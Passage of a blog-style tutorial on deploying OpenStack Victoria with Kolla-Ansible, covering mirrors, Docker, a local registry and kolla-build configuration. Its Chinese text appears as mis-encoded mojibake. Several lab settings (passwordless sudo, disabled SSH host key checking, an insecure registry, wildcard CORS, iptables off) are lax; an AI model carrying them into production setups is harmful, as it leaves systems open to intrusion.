GB</li><li>ç¡¬ç›˜ 500 GB</li><li>ç½‘å¡1</li><li>ç½‘å¡2ï¼ˆæœªå¯ç”¨ï¼‰</li></ul></li></ol><p>åœ¨éƒ¨ç½²èŠ‚ç‚¹ç”¨ multinode é…ç½®è¿œç¨‹éƒ¨ç½² OpenStackï¼Œè™½ç„¶è¿™é‡Œåªæœ‰ä¸€å° OpenStack ä¸»æœºğŸ˜‚</p><h1 id="æ§åˆ¶èŠ‚ç‚¹"><a href="#æ§åˆ¶èŠ‚ç‚¹" class="headerlink" title="æ§åˆ¶èŠ‚ç‚¹"></a>æ§åˆ¶èŠ‚ç‚¹</h1><p>æ§åˆ¶èŠ‚ç‚¹åªéœ€ç»™ç”¨æˆ·é…ç½® sudo æƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ·»åŠ ç”¨æˆ·</span></span><br><span class="line">sudo vim /etc/sudoers</span><br><span class="line"><span class="comment">##includedir /etc/sudoers.d</span></span><br><span class="line"><span class="comment">#op1 ALL=(ALL) NOPASSWD: ALL</span></span><br></pre></td></tr></table></figure><blockquote><p>Prior to Queens, when users want to connect using non-root user, they must add extra option <code>ansible_become=True</code> which is inconvenient and add security risk. In Queens, almost all services have support for escalation for only necessary tasks. In Rocky, all services have this capability, so users do not need to add <code>ansible_become</code> option if connection user has passwordless sudo capability.</p></blockquote><h1 id="éƒ¨ç½²èŠ‚ç‚¹"><a href="#éƒ¨ç½²èŠ‚ç‚¹" class="headerlink" title="éƒ¨ç½²èŠ‚ç‚¹"></a>éƒ¨ç½²èŠ‚ç‚¹</h1><h2 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h2><ol><li><p>é…ç½® Python3</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è®¾ä¸ºé»˜è®¤</span></span><br><span class="line">sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.8 1</span><br><span class="line"><span class="comment">#sudo update-alternatives --remove python /usr/bin/python3.8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£… pip</span></span><br><span class="line">sudo apt install -y python3-pip</span><br></pre></td></tr></table></figure></li><li><p>æ›´æ¢ pip æº</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºæ–‡ä»¶å¤¹</span></span><br><span class="line">mkdir .pip &amp;&amp; <span class="built_in">cd</span> .pip</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºå¹¶ç¼–è¾‘é…ç½®æ–‡ä»¶</span></span><br><span class="line">sudo vim pip.conf</span><br></pre></td></tr></table></figure><p> é…ç½®å¦‚ä¸‹</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout &#x3D; 6000</span><br><span class="line">index-url &#x3D; http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br><span class="line">trusted-host &#x3D; mirrors.aliyun.com</span><br></pre></td></tr></table></figure></li><li><p>æ›´æ¢ Ubuntu æº</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¤‡ä»½</span></span><br><span class="line">sudo mv /etc/apt/sources.list /etc/apt/sources.list.bk</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®é•œåƒæº</span></span><br><span class="line">sudo vim /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›´æ–°æº</span></span><br><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‡çº§</span></span><br><span class="line">sudo apt dist-upgrade -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡å¯</span></span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure><p> é•œåƒæºé…ç½®å¦‚ä¸‹ï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é»˜è®¤æ³¨é‡Šäº†æºç é•œåƒä»¥æé«˜ apt update é€Ÿåº¦ï¼Œå¦‚æœ‰éœ€è¦å¯è‡ªè¡Œå–æ¶ˆæ³¨é‡Š</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></span><br></pre></td></tr></table></figure></li><li><p>é…ç½®å…å¯†ç™»å½•</p><p> æ·»åŠ åŸŸåè§£æ /etc/hosts</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># local</span></span><br><span class="line">10.111.1.125 controller</span><br><span class="line"> </span><br><span class="line"><span class="comment"># openstack</span></span><br><span class="line">10.111.1.250 openstack01</span><br></pre></td></tr></table></figure><p> ç”Ÿæˆå¯†é’¥å¹¶æ‹·è´åˆ°ç›®æ ‡ä¸»æœº</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line">ssh-copy-id -i /home/jck/.ssh/id_rsa.pub op1@openstack01</span><br></pre></td></tr></table></figure></li><li><p>å®‰è£…ä¾èµ–</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ›´æ–°æº</span></span><br><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£… Python æ„å»ºä¾èµ–</span></span><br><span class="line">sudo apt install python3-dev libffi-dev gcc libssl-dev -y</span><br></pre></td></tr></table></figure><p> å®‰è£… <code>venv</code>ï¼Œåˆ›å»ºå¹¶ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒ</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£… venv</span></span><br><span class="line">sudo apt install python3-venv -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line">mkdir code</span><br><span class="line">python -m venv ~/code</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line"><span class="built_in">source</span> ~/code/bin/activate</span><br></pre></td></tr></table></figure></li><li><p>å®‰è£… Kolla-Ansibleï¼ŒæŒ‡å®š Victoria ç‰ˆæœ¬</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®‰è£… Ansible</span></span><br><span class="line">pip install -U pip</span><br><span class="line">pip install <span class="string">&#x27;ansible&lt;3.0&#x27;</span></span><br><span class="line">pip install kolla-ansible</span><br><span class="line">pip install kolla</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹è½½æºç </span></span><br><span class="line"><span class="comment">#pip install &#x27;ansible&lt;2.10&#x27;</span></span><br><span class="line"><span class="comment">#git clone https://github.com/openstack/kolla -b stable/victoria</span></span><br><span class="line"><span class="comment">#git clone https://github.com/openstack/kolla-ansible -b stable/victoria</span></span><br><span class="line"><span class="comment"># å®‰è£…</span></span><br><span class="line"><span class="comment">#pip install ./kolla</span></span><br><span class="line"><span class="comment">#pip install ./kolla-ansible</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºç›®å½•</span></span><br><span class="line">sudo mkdir -p /etc/kolla</span><br><span class="line"></span><br><span class="line"><span class="comment"># æƒé™è®¾ç½®</span></span><br><span class="line">sudo chown <span class="variable">$USER</span>:<span class="variable">$USER</span> /etc/kolla</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹·è´é…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="comment">#cp -r kolla-ansible/etc/kolla/* /etc/kolla</span></span><br><span class="line"><span class="comment">#cp kolla-ansible/ansible/inventory/* .</span></span><br><span class="line">cp -r /home/jck/code/share/kolla-ansible/etc_examples/kolla/* /etc/kolla</span><br><span class="line">cp /home/jck/code/share/kolla-ansible/ansible/inventory/* .</span><br></pre></td></tr></table></figure></li><li><p>é…ç½® Ansible</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»º</span></span><br><span class="line">sudo mkdir /etc/ansible</span><br><span class="line">sudo vim /etc/ansible/ansible.cfg</span><br></pre></td></tr></table></figure><p> é…ç½®å¦‚ä¸‹</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[defaults]</span><br><span class="line">host_key_checking&#x3D;False</span><br><span class="line">pipelining&#x3D;True</span><br><span class="line">forks&#x3D;100</span><br></pre></td></tr></table></figure></li><li><p>å®‰è£… Docker å’Œ docker-compose</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg \</span><br><span class="line">    lsb-release</span><br><span class="line"> </span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br><span class="line"> </span><br><span class="line"><span class="built_in">echo</span> \</span><br><span class="line">  <span class="string">&quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">  <span class="subst">$(lsb_release -cs)</span> stable&quot;</span> | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="line">   </span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y docker-ce docker-ce-cli containerd.io</span><br><span class="line"> </span><br><span class="line"><span class="comment"># ç”¨æˆ·ç»„è®¾ç½®</span></span><br><span class="line">sudo groupadd docker</span><br><span class="line">sudo usermod -aG docker <span class="variable">$USER</span></span><br><span class="line">newgrp docker</span><br><span class="line"> </span><br><span class="line"><span class="comment"># å¼€æœºå¯åŠ¨</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> docker.service</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> containerd.service</span><br><span class="line"> </span><br><span class="line"><span class="comment"># docker-compose</span></span><br><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"> </span><br><span class="line">sudo chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure><p> åˆ›å»ºé…ç½®æ–‡ä»¶ /etc/docker/daemon.jsonï¼Œè®¾ç½®å›½å†…é•œåƒæº</p> <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;registry-mirrors&quot;:</span> [</span><br><span class="line">        <span class="string">&quot;http://hub-mirror.c.163.com&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;insecure-registries&quot;:</span> [</span><br><span class="line">        <span class="string">&quot;10.111.1.125:5000&quot;</span> <span class="comment"># æŒ‡å‘ä¹‹åéƒ¨ç½²çš„æœ¬åœ°é•œåƒä»“åº“</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;iptables&quot;:</span> <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;log-opts&quot;:</span> &#123;</span><br><span class="line">        <span class="attr">&quot;max-file&quot;:</span> <span class="string">&quot;5&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;max-size&quot;:</span> <span class="string">&quot;50m&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> é‡å¯ docker æœåŠ¡</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure></li></ol><h2 id="registry-registry-ui"><a href="#registry-registry-ui" class="headerlink" title="registry + registry-ui"></a>registry + registry-ui</h2><p>ç›´æ¥ä½¿ç”¨ <a href="https://github.com/Joxit/docker-registry-ui">Joxit/docker-registry-ui</a> ä»“åº“çš„ç¤ºä¾‹é…ç½®ï¼Œåœ¨æœ¬åœ°éƒ¨ç½² registry å’Œ registry-ui</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å…‹éš†ä»“åº“</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Joxit/docker-registry-ui.git</span><br><span class="line"><span class="built_in">cd</span> docker-registry-ui/examples/ui-as-standalone</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹é…ç½® localhost -&gt; 10.111.1.125</span></span><br><span class="line">vim simple.yml</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹é…ç½® Access-Control-Allow-Origin: [&#x27;*&#x27;]</span></span><br><span class="line">vim registry-config/simple.yml</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿è¡Œå®¹å™¨</span></span><br><span class="line">docker-compose -f simple.yml up -d</span><br></pre></td></tr></table></figure><p><em>PSï¼šç”¨å®Œä¹‹åæ‰å‘ç°å®Œå…¨å¯ä»¥æ­ä¸ª harbor ç”¨â€¦</em></p><p><img src="https://i.loli.net/2021/08/31/VrvtLg7TQ1YxwcH.png"></p><h2 id="æ„å»ºåŸºç¡€é•œåƒ"><a href="#æ„å»ºåŸºç¡€é•œåƒ" class="headerlink" title="æ„å»ºåŸºç¡€é•œåƒ"></a>æ„å»ºåŸºç¡€é•œåƒ</h2><p>ç¼–å†™ ubuntu 20.04 åŸºç¡€é•œåƒ Dockerfileï¼Œæ›¿æ¢ source æºå’Œ pip æºï¼Œ</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> pip.conf /etc/pip.conf</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> sources.list /etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update</span></span><br></pre></td></tr></table></figure><p>æ›¿æ¢ pip æºï¼ˆpip.confï¼‰</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[global]</span></span><br><span class="line"><span class="attr">timeout</span> = <span class="number">6000</span></span><br><span class="line"><span class="attr">index-url</span> = http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"><span class="attr">trusted-host</span> = mirrors.aliyun.com</span><br></pre></td></tr></table></figure><p>æ›¿æ¢ sources.listï¼Œæ³¨æ„è¿™é‡Œå†™çš„æ˜¯ <code>http</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é»˜è®¤æ³¨é‡Šäº†æºç é•œåƒä»¥æé«˜ apt update é€Ÿåº¦ï¼Œå¦‚æœ‰éœ€è¦å¯è‡ªè¡Œå–æ¶ˆæ³¨é‡Š</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></span><br></pre></td></tr></table></figure><p>æ„å»ºé•œåƒå¹¶å‘å¸ƒåˆ° dockerhub</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ„å»ºé•œåƒï¼Œ--network=host é¿å…åŸŸåè§£æé”™è¯¯</span></span><br><span class="line">docker build --network=host -t lycanj/kolla_ansible-base_image-ubuntu:20.04 .</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç™»å½• dockerhub</span></span><br><span class="line">docker login</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸Šä¼ åˆ° dockerhub</span></span><br><span class="line">docker push lycanj/kolla_ansible-base_image-ubuntu:20.04</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/31/4KVtSW6Bx5NYaeh.jpg"></p><h2 id="æ„å»ºç»„ä»¶é•œåƒ"><a href="#æ„å»ºç»„ä»¶é•œåƒ" class="headerlink" title="æ„å»ºç»„ä»¶é•œåƒ"></a>æ„å»ºç»„ä»¶é•œåƒ</h2><p>ä¸‹è½½ Victoria ç»„ä»¶æºç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/keystone.git --branch stable/victoria --single-branch</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/glance.git --branch stable/victoria --single-branch</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/nova.git --branch stable/victoria --single-branch</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/neutron.git --branch stable/victoria --single-branch</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/heat.git --branch stable/victoria --single-branch</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ kolla-build ç”Ÿæˆé•œåƒï¼Œå¹¶ push åˆ°æœ¬åœ°ä»“åº“ã€‚ä¸‹è½½ kolla ä»“åº“å¹¶ä½¿ç”¨ tox ç”Ÿæˆé…ç½®æ–‡ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å…‹éš†ä»“åº“</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/kolla.git --branch stable/victoria</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£… toxï¼ˆè™šæ‹Ÿç¯å¢ƒä¸­ï¼‰</span></span><br><span class="line">pip install tox</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆé…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="built_in">cd</span> kolla</span><br><span class="line">tox -e genconfig</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹é…ç½®æ–‡ä»¶</span></span><br><span class="line">vim kolla/etc/kolla/kolla-build.conf</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><ul><li>æŒ‡å®šåŸºç¡€ ubuntu é•œåƒ</li><li>ä½¿ç”¨æºç æ„å»ºé•œåƒ</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[DEFAULT]</span></span><br><span class="line"><span class="comment"># The distro type of the base image. (string value)</span></span><br><span class="line"><span class="comment"># Possible values:</span></span><br><span class="line"><span class="comment"># centos - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># rhel - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># ubuntu - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># debian - &lt;No description provided&gt;</span></span><br><span class="line"><span class="attr">base</span> = ubuntu</span><br><span class="line"></span><br><span class="line"><span class="comment"># The base image name. Default is the same with base. (string value)</span></span><br><span class="line"><span class="attr">base_image</span> = lycanj/kolla_ansible-base_image-ubuntu</span><br><span class="line"></span><br><span class="line"><span class="comment"># The Docker namespace name (string value)</span></span><br><span class="line"><span class="comment">#namespace = kolla</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The network mode for Docker build. Example: host (string value)</span></span><br><span class="line"><span class="attr">network_mode</span> = host</span><br><span class="line"></span><br><span class="line"><span class="comment"># Push images after building (boolean value)</span></span><br><span class="line"><span class="attr">push</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The docker registry host. The default registry host is Docker Hub</span></span><br><span class="line"><span class="comment"># (string value)</span></span><br><span class="line"><span class="attr">registry</span> = <span class="number">10.111</span>.<span class="number">1.125</span>:<span class="number">5000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The method of the OpenStack install. (string value)</span></span><br><span class="line"><span class="comment"># Possible values:</span></span><br><span class="line"><span class="comment"># binary - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># source - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># rdo - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># rhos - &lt;No description provided&gt;</span></span><br><span class="line"><span class="attr">install_type</span> = source</span><br><span class="line"></span><br><span class="line"><span class="comment"># The Docker tag (string value)</span></span><br><span class="line"><span class="attr">tag</span> = victoria</span><br><span class="line"></span><br><span class="line"><span class="comment"># OpenStack release for building kolla-toolbox (string value)</span></span><br><span class="line"><span class="attr">openstack_release</span> = victoria</span><br><span class="line"></span><br><span class="line"><span class="comment"># Branch for source images (string value)</span></span><br><span class="line"><span class="attr">openstack_branch</span> = victoria-stable</span><br><span class="line"></span><br><span class="line"><span class="comment"># Content of the maintainer label (string value)</span></span><br><span class="line"><span class="comment">#maintainer = Kolla Project (https://launchpad.net/kolla)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Path to custom sources.list (string value)</span></span><br><span class="line"><span class="comment">#apt_sources_list = &lt;None&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[keystone-base]</span></span><br><span class="line"><span class="comment"># Source location type (string value)</span></span><br><span class="line"><span class="comment"># Possible values:</span></span><br><span class="line"><span class="comment"># local - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># git - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># url - &lt;No description provided&gt;</span></span><br><span class="line"><span class="attr">type</span> = local</span><br><span class="line"></span><br><span class="line"><span class="comment"># The location for source install (string value)</span></span><br><span class="line"><span class="attr">location</span> = /home/jck/keystone</span><br><span class="line"></span><br><span class="line"><span class="section">[glance-base]</span></span><br><span class="line"><span 